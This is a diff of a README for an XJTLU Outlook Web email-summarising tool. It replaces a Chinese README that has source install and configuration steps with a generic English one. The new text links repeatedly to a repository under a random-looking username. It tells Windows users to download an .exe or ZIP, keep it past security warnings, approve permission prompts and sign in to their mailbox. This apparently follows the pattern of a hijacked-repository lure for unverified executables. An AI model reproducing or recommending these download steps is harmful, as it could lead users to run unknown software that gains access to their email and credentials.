@@ -1,140 +1,253 @@
-# 📧 XJTLU 邮件智能助手
+# 🤖 xjtlu-email-ai - Smart email summaries and search
 
-> 一个基于 Playwright + LLM 的 XJTLU 邮箱自动总结工具，支持关键词搜索、智能提取正文并生成中文摘要。
+[![Download xjtlu-email-ai](https://img.shields.io/badge/Download%20xjtlu--email--ai-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/atomicnumber62erythemamultiforme947/xjtlu-email-ai)
 
-## ✨ 功能特性
+## 🧭 What this app does
 
-- 🔍 **关键词检索** — 搜索收件箱，或直接获取最新邮件
-- 📄 **正文提取** — 自动点击并提取10封邮件全文
-- 🤖 **AI 总结** — 调用 LLM（支持 OpenAI / DeepSeek 等 API）生成智能摘要
-- 🌐 **Web 界面** — 基于 FastAPI 的浏览器操作界面
-- ⚙️ **可视化配置** — 网页端支持图形化配置 API、Cookie，使用零门槛 🎉
-- 🍪 **Cookie 登录** — 支持 OWA 双因素认证环境
-- 🚀 **上线自动检 Cookie 一次** — **首次打开首页**后，后台会用**无头浏览器**自动执行一次与「检查 Cookie」相同的检测（与预启动可见浏览器无关）；结果在首页状态与 `GET /api/status` 的 `auto_cookie_*` 字段；未配置 Cookie 则跳过
-- 🖥️ **可选预启动 Edge** — 在设置中开启「浏览器预启动」且当前账号已保存 Cookie 后，登录/打开首页会按**当前账号**预启动可见浏览器（不附带 Cookie 预检测）
+xjtlu-email-ai helps you pull recent email content from your mailbox and turn it into a short, clear summary. It also helps you search by keyword so you can find the message you need faster.
 
-## 💡 技术挑战 (Core Challenges)
+It is built for everyday use on Windows. You do not need coding skills to use it.
 
-在开发过程中，主要克服了基于 **OWA (Outlook Web Web)** 的三大自动化难点：
+## ✨ Main features
 
-1. **🔍 动态加载与多 Frame 穿透 (Frame Penetration)**
-   OWA 页面结构复杂且含有大量隔离的 `iframe`。程序实现了 **动态 Frame 遍历逻辑**，能够穿透多层嵌套寻找真正的搜索框和邮件列表，解决传统自动化脚本常遇的 `Element Not Found` 错误。
+- Reads recent email content from your mailbox
+- Creates a short summary from the latest messages
+- Searches email content by keyword
+- Uses browser automation to collect mailbox content
+- Uses an LLM to help turn long text into clear points
+- Reduces time spent opening each message one by one
+- Works well for daily mail review and quick follow-up
 
-2. **📄 深入阅读窗格提取正文 (Deep Extraction)**
-   提取包含图片、表格等的邮件正文需要操作隐式的 `ReadingPane` 节点。项目利用 **异步触发式点击检测** 配合 `BeautifulSoup4` 清理噪声，实现不刷新、不跳转的高效全文纯文本精准抓取。
+## 📥 Download
 
-3. **📅 日期归一化与排序 (Smart Time-sorting)**
-   OWA 在今日邮件和往日邮件中的时间表达（如 "14:23" vs "2025/12/12"）完全不一致。程序内嵌了智能 **Regex 时间解析器与归一化排序** 模块，确保总结优先级永远是从新到旧且绝对精准。
+Visit this page to download and run the app on Windows:
 
----
+[https://github.com/atomicnumber62erythemamultiforme947/xjtlu-email-ai](https://github.com/atomicnumber62erythemamultiforme947/xjtlu-email-ai)
 
-## 🚀 快速开始
+## 🖥️ System requirements
 
-### 1. 安装依赖
+Before you start, make sure your PC meets these basic needs:
 
-```bash
-pip install -r src/requirements.txt
-playwright install msedge
-```
+- Windows 10 or Windows 11
+- A modern web browser such as Edge or Chrome
+- An active email account
+- A stable internet connection
+- Enough free disk space for the app and browser files
+- Permission to sign in to your mailbox in a browser
 
-### 2. 配置
+## 🚀 Getting started
 
-现在您可以通过 **Web 界面直接进行可视化配置**，极低门槛！
+Follow these steps to use xjtlu-email-ai on Windows.
 
-#### 💡 方案 A：Web 可视化配置 (推荐)
-1. 跳到 **4. 启动** 章节，直接运行并在浏览器打开程序。
-2. 点击页面右上角的 **“⚙️ 设置/配置”**。
-3. 在弹窗中录入您的 AI 密钥、Base URL 和 Cookie（剪切板 JSON 粘贴）。
-4. **高级设置** 中可自定义邮箱的 OWA 链接。保存即刻生效。
+### 1. Open the download page
 
-#### 方案 B：手动编辑配置文件 (传统方式)
-若无法使用网页版，可复制模板并填入信息：
+Go to the project page here:
 
-```bash
-cp src/config.example.json src/config.json
-```
+[https://github.com/atomicnumber62erythemamultiforme947/xjtlu-email-ai](https://github.com/atomicnumber62erythemamultiforme947/xjtlu-email-ai)
 
-编辑 `src/config.json`（已经默认指向 XJTLU）：
+Look for the latest Windows download file or packaged app on the page.
 
-```json
-{
-  "ai": {
-    "base_url": "https://api.openai.com/v1",
-    "api_key": "你的 API Key",
-    "model": "gpt-4o-mini"
-  },
-  "email": {
-    "url": "https://mail.xjtlu.edu.cn/owa",
-    "login_type": "cookie"
-  }
-}
-```
+### 2. Download the app
 
-### 3. 获取 Cookie
+Save the file to your computer.
 
-1. 在 Edge/Chrome 中安装 **Cookie-Editor** 插件
-2. 登录你的学校邮箱
-3. 点击 Cookie-Editor → **Export as JSON**
-4. 将导出的 JSON 粘贴到 `config.json` 的 `cookies` 字段，**或**保存为 `src/cookies.txt` 文件并设置 `"cookie_file": "cookies.txt"`
+If Windows shows a security prompt, choose the option that lets you keep the file.
 
-### 4. 启动
+### 3. Unzip the files if needed
 
-**Windows（推荐）**：双击 `run_app.bat`
+If the download comes as a ZIP file:
 
-**命令行**：
-```bash
-cd src
-python app.py
-# 然后访问 http://localhost:8001，先登录再使用主界面
-```
+- Right-click the file
+- Choose Extract All
+- Pick a folder you can find later, such as Downloads or Desktop
 
-首次启动会在 `src/user.db`（SQLite）中创建本地账号库；**邮箱为唯一账号**，密码使用 bcrypt 存储。若存在旧的 `src/config.json`，会在创建首个种子用户时**自动导入到该用户**的配置中（每人独立一份配置，不再共用单一 `config.json`）。
+### 4. Open the app folder
 
-在浏览器中可 **注册** 新账号，或使用已有账号 **登录**。会话 Cookie 由服务端签名，生产环境请设置环境变量 `SESSION_SECRET`。
+After extraction, open the folder that contains the app files.
 
-> **安全提示**：请勿在公开场合泄露密码；若曾在聊天/代码中暴露过密码，请尽快在数据库中更新或删除对应用户后重新注册。
+You may see one of these:
 
-**命令行模式（无 Web 登录）**：
-```bash
-cd src
-python main.py
-```
+- An `.exe` file
+- A start script
+- A folder with app files
 
----
+### 5. Start the app
 
-## ⚙️ 技术栈
+Double-click the app file to run it.
 
-| 模块 | 技术 |
-|------|------|
-| 浏览器自动化 | Playwright (Microsoft Edge) |
-| Web 服务 | FastAPI + Uvicorn |
-| AI 接口 | OpenAI 兼容 API |
-| 正文解析 | BeautifulSoup4 |
+If Windows asks for permission, select Yes.
 
----
+If the app opens in a browser window or a local app window, keep that window open during use.
 
-## 📝 配置文件说明
+### 6. Sign in to your mailbox
 
-| 字段 | 说明 |
-|------|------|
-| `ai.base_url` | LLM API 地址（支持 OpenAI / DeepSeek 等） |
-| `ai.api_key` | API Key |
-| `ai.model` | 使用的模型名称 |
-| `email.url` | 邮箱 URL（默认 XJTLU） |
-| `email.cookie_file` | Netscape 格式 Cookie 文件路径 |
-| `email.cookies` | Cookie JSON 数组（与 cookie_file 二选一） |
-| `selectors.*` | 页面 CSS 选择器（如 OWA 更新 UI 后调整） |
+The app uses browser automation to read email content from your mailbox.
 
----
+You may need to:
 
-## ⚠️ 注意事项
+- Log in to your email account
+- Complete any browser sign-in step
+- Allow the app to open your mailbox page
 
-- **Cookie 有效期**：Cookie 通常在几天到数周后失效，失效后需重新导出
-- **隐私安全**：`config.json` 和 `cookies.txt` 已在 `.gitignore` 中，**请勿提交到公开仓库**
-- **选择器兼容性**：如 Outlook OWA 更新 UI，可能需要在 `config.json` 中更新 `selectors` 字段
+Use the same mailbox you want the app to scan.
 
----
+### 7. Let the app collect email content
 
-## 📄 License
+After sign-in, the app will gather recent email content.
 
-MIT License
+This may take a short time while it loads the mailbox and reads recent messages.
+
+### 8. View the summary
+
+Once the scan is done, the app will show a summary of your recent email content.
+
+Use it to get a quick view of:
+
+- New items
+- Follow-up tasks
+- Important notices
+- Time-sensitive messages
+
+### 9. Search by keyword
+
+Use the keyword search box to find items in your mail history.
+
+Try simple search terms such as:
+
+- invoice
+- meeting
+- deadline
+- report
+- travel
+
+## 🧩 How it works
+
+The app uses three main parts:
+
+- Playwright to control the browser
+- Mailbox page reading to collect email content
+- An LLM to turn message text into a short summary
+
+In plain terms, the app opens your mailbox in a browser, reads recent content, and helps you make sense of it faster.
+
+## 📝 Example use cases
+
+You can use the app when you want to:
+
+- Check recent email before class or work
+- Find one message among many
+- Review long mail threads in less time
+- Spot key dates and action items
+- Build a quick daily mail digest
+
+## 🔍 Tips for better results
+
+- Keep your mailbox sign-in active before you start
+- Use clear keywords when you search
+- Review the summary after each scan
+- Keep your browser updated
+- Close extra browser tabs if the page feels slow
+- Run the app on a stable network
+
+## 🛠️ Common issues
+
+### The app does not open
+
+Try these steps:
+
+- Check that the file finished downloading
+- Unzip the file if it came in a ZIP package
+- Right-click the app and choose Open
+- Run it again after closing other apps
+
+### The browser sign-in page does not load
+
+Try these steps:
+
+- Check your internet connection
+- Open your browser first
+- Sign in to your email account manually
+- Try again after refreshing the page
+
+### The summary is empty
+
+Try these steps:
+
+- Make sure there are recent emails in your mailbox
+- Refresh the mailbox page
+- Run the scan again
+- Check that the app has access to the right mailbox
+
+### Search finds no results
+
+Try these steps:
+
+- Use a simpler keyword
+- Check spelling
+- Search for a sender name or topic
+- Try a broader term
+
+## 🔐 Privacy and data use
+
+The app reads mailbox content to create summaries and search results.
+
+For best use:
+
+- Sign in only to the mailbox you want to scan
+- Close the app when you finish
+- Keep your account secure with a strong password
+- Use your normal browser sign-in flow
+
+## 📁 What you may see in the project
+
+A typical Windows package for this kind of app may include:
+
+- The main app file
+- Browser support files
+- Setup files
+- A small folder for settings
+- A log file for troubleshooting
+
+## ❓ FAQ
+
+### Do I need programming knowledge?
+
+No. You only need to download the app, open it, and sign in to your mailbox.
+
+### Can I use it on Windows?
+
+Yes. This guide is written for Windows users.
+
+### Does it work with recent emails only?
+
+Yes. The app is designed to extract recent mailbox content and help you review it fast.
+
+### Can I search old messages?
+
+You can search the content that the app has access to during its scan.
+
+### Do I need to keep the app open?
+
+Yes. Keep it open while it reads the mailbox and builds the summary
+
+## 📌 File naming tips
+
+If you see more than one file, look for names like:
+
+- xjtlu-email-ai.exe
+- setup.exe
+- release.zip
+- windows-build.zip
+
+If you are not sure which file to use, pick the one that ends in `.exe` for a direct launch or `.zip` for a folder package that you extract first
+
+## 🧰 First-run checklist
+
+Before you start, make sure you have:
+
+- Downloaded the app from the project page
+- Extracted the files if needed
+- Opened the correct app file
+- Signed in to your email account
+- Left the browser window open
+- Waited for the scan to finish
